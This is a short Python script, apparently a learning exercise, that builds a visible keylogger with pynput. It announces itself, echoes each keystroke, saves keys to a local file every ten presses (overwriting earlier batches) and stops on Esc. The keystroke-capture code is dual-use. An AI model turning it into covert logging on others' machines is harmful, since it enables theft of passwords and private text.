#install pynput with IDE or with CMD "pip install pynput" before running program
import pynput

# Importing keyboard listener from pynput library
from pynput.keyboard import Key, Listener

# Display a welcome message
def welcome_message():
    print("Welcome to my Keylogger Program!")
    print("This program will log your keystrokes.")
    print("Press 'Esc' to stop the keylogger and exit the program.")
    print("The logs will be saved in 'keys.txt'.\n")

welcome_message()  # Call the function to show the introduction

count = 0
keys = []

# Triggered when a key is pressed
def pressed(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    # Save keys to file after every 10 keystrokes
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# Writes the captured keys to 'keys.txt'
def write_file(keys):
    with open('keys.txt', 'w') as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write('\n')
            elif k.find("key") == -1:
                file.write(k)

# Stops the listener if 'esc' is released
def released(key):
    if key == Key.esc:
        print("\nExiting the Keylogger Program. Goodbye!")
        return False

# Start listening for keyboard events
with Listener(on_press=pressed, on_release=released) as listener:
    listener.join()

#source used: https://www.youtube.com/watch?v=TbMKwl11itQ
